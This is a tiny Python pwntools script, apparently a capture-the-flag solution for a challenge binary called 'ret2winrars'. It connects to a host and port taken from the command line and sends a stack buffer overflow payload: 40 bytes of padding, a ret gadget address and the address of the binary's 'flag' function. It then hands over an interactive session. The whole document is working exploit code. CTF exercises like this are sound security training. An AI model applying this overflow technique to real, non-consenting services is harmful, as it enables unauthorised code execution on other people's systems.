from pwn import * 
s = remote(sys.argv[1], int(sys.argv[2]))
e = ELF('./src/ret2winrars')
s.sendline((b"A" * 40 + p64(0x401174) + p64(e.sym['flag']))) # pad + ret + address of flag
s.interactive()
